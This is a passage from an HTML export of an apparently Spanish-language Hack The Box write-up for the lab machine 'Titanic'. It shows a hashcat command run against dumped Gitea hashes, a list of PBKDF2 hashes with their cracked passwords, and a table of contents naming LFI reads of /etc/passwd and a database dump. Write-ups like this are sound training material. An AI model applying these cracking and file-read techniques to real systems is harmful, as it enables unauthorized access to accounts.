+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">hashcat:</p></div><div class="el-pre"><pre><code data-line="0">hashcat gitea.hashes rockyou.txt --user
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div></div></div></div></div><div class="el-h1 heading-wrapper"><h1 data-heading="Password Developer" dir="auto" class="heading" id="Password_Developer">Password Developer</h1><div class="heading-children"><div class="el-pre"><pre class="language-sql" tabindex="0"><code data-line="0" class="language-sql is-loaded">developer:sha256:<span class="token number">50000</span>:i<span class="token operator">/</span>PjRSt4VE<span class="token operator">+</span>L7pQA1pNtNA<span class="token operator">=</span><span class="token operator">=</span>:<span class="token number">5</span>THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO<span class="token operator">/</span>F2<span class="token operator">+</span><span class="token number">8</span>wvxaCYZJjRE6llM<span class="token operator">+</span><span class="token number">1</span>Y<span class="token operator">=</span>:<span class="token number">25282528</span>
+test1:sha256:<span class="token number">50000</span>:<span class="token operator">+</span><span class="token number">76</span>JfF9<span class="token operator">+</span>Ksx<span class="token operator">+</span>lmLaHGAz<span class="token operator">+</span>A<span class="token operator">=</span><span class="token operator">=</span>:Do0DDUgcVKZRqM23PG<span class="token operator">/</span>bGykAVlrh9<span class="token operator">+</span>lempQ5VPv3IlZbdu1p<span class="token operator">+</span><span class="token number">65</span>WCkvVXB51ucUmKQA<span class="token operator">=</span>:<span class="token number">123456789</span>
+hacker:sha256:<span class="token number">50000</span>:x7aGusNrFPEXErbgJ<span class="token operator">/</span>c7tw<span class="token operator">=</span><span class="token operator">=</span>:LOFZ<span class="token operator">/</span>xlzebhZghfzBP1ivyNVPlGhKzClDeTs<span class="token operator">/</span>BKt1CFOiPKWntqpW<span class="token operator">+</span>a0Futlnbj7H5g<span class="token operator">=</span>:<span class="token number">12345678</span>
+kali:sha256:<span class="token number">50000</span>:zN7pMUBaL1oReGYaGF9ktg<span class="token operator">=</span><span class="token operator">=</span>:HLkixpbe52LAGK1gb4<span class="token operator">/</span>X7Kh<span class="token operator">/</span>lkKAmjGXyY62YaXnTxpKSb7UTvlBfXmLXNtGBk0GmLw<span class="token operator">=</span>:password
+cher0:sha256:<span class="token number">50000</span>:VpoIOf<span class="token operator">+</span>qbEoZSJpdEAbPEg<span class="token operator">=</span><span class="token operator">=</span>:LxvR7kwoYpo<span class="token operator">/</span><span class="token number">3</span>IEFyPo<span class="token operator">/</span>pHly3IBVMapJuWKzCa1xd<span class="token operator">+</span>g7BQbyLrlIc3QFZfH0NP0tbTs<span class="token operator">=</span>:<span class="token number">12345678</span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="mod-footer mod-ui"></div></div></div></div></div></div><div class="sidebar-right sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="graph-view-wrapper"><div class="sidebar-section-header">Interactive Graph</div><div class="graph-view-placeholder">
+		<div class="graph-view-container">
+			<div class="graph-icon graph-expand" role="button" aria-label="Expand" data-tooltip-position="top"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></div>
+			<canvas id="graph-canvas" class="hide" width="512px" height="512px"></canvas>
+		</div>
+		</div></div><div class="tree-container mod-root nav-folder tree-item outline-tree" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Table Of Contents</span><button class="clickable-icon collapse-tree-button" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-scroll-area tree-item-children nav-folder-children"><div class="tree-item mod-tree-folder nav-folder mod-collapsible is-collapsed" style="display: none;"></div><div class="tree-item" data-depth="1"><a class="tree-link" href="machines/titanic/1.recon.html#1.Recon"><div class="tree-item-contents heading-link" heading-name="1.Recon"><span class="tree-item-title">1.Recon</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-link" href="machines/titanic/1.recon.html#Nmap_summary"><div class="tree-item-contents heading-link" heading-name="Nmap summary"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">Nmap summary</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/titanic/1.recon.html#Syn_scan"><div class="tree-item-contents heading-link" heading-name="Syn scan"><span class="tree-item-title">Syn scan</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/titanic/1.recon.html#sCV_scan"><div class="tree-item-contents heading-link" heading-name="sCV scan"><span class="tree-item-title">sCV scan</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item mod-collapsible" data-depth="3"><a class="tree-link" href="machines/titanic/1.recon.html#Puerto_80"><div class="tree-item-contents heading-link" heading-name="Puerto 80"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">Puerto 80</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="4"><a class="tree-link" href="machines/titanic/1.recon.html#Fuzzing"><div class="tree-item-contents heading-link" heading-name="Fuzzing"><span class="tree-item-title">Fuzzing</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-link" href="machines/titanic/1.recon.html#LFI"><div class="tree-item-contents heading-link" heading-name="LFI"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">LFI</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/titanic/1.recon.html#/etc/passwd"><div class="tree-item-contents heading-link" heading-name="/etc/passwd"><span class="tree-item-title">/etc/passwd</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/titanic/1.recon.html#Archivo_hosts"><div class="tree-item-contents heading-link" heading-name="Archivo hosts"><span class="tree-item-title">Archivo hosts</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-link" href="machines/titanic/1.recon.html#Subdominio_dev.titanic.htb"><div class="tree-item-contents heading-link" heading-name="Subdominio dev.titanic.htb"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">Subdominio dev.titanic.htb</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item mod-collapsible" data-depth="3"><a class="tree-link" href="machines/titanic/1.recon.html#Gitea"><div class="tree-item-contents heading-link" heading-name="Gitea"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">Gitea</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item mod-collapsible" data-depth="4"><a class="tree-link" href="machines/titanic/1.recon.html#docker-config"><div class="tree-item-contents heading-link" heading-name="docker-config"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">docker-config</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="5"><a class="tree-link" href="machines/titanic/1.recon.html#Mysql"><div class="tree-item-contents heading-link" heading-name="Mysql"><span class="tree-item-title">Mysql</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="5"><a class="tree-link" href="machines/titanic/1.recon.html#Gitea"><div class="tree-item-contents heading-link" heading-name="Gitea"><span class="tree-item-title">Gitea</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item mod-collapsible" data-depth="4"><a class="tree-link" href="machines/titanic/1.recon.html#flask-app"><div class="tree-item-contents heading-link" heading-name="flask-app"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">flask-app</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="5"><a class="tree-link" href="machines/titanic/1.recon.html#App.py"><div class="tree-item-contents heading-link" heading-name="App.py"><span class="tree-item-title">App.py</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/titanic/1.recon.html#GiteaDB_y__Developer_password"><div class="tree-item-contents heading-link" heading-name="GiteaDB y  Developer password"><span class="tree-item-title">GiteaDB y  Developer password</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/titanic/1.recon.html#**Cómo_están_hasheadas_las_contraseñas**"><div class="tree-item-contents heading-link" heading-name="**Cómo están hasheadas las contraseñas**"><span class="tree-item-title"><strong>Cómo están hasheadas las contraseñas</strong></span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="machines/titanic/1.recon.html#Password_Developer"><div class="tree-item-contents heading-link" heading-name="Password Developer"><span class="tree-item-title">Password Developer</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div><script defer="">let rs = document.querySelector(".sidebar-right"); rs.classList.add("is-collapsed"); if (window.innerWidth > 768) rs.classList.remove("is-collapsed"); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></body></html>
